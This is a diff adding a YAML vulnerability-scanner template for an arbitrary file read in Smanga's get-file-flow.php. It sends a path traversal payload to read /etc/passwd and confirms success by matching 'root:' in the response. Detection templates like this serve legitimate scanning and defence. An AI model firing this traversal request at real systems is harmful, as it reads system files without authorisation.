@@ -1,0 +1,30 @@
+id: poc-yaml-smanga-get-file-flow-php-anyfile-read
+info:
+  name: Smanga get-file-flow.php Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        POST /php/get-file-flow.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        file=../../etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
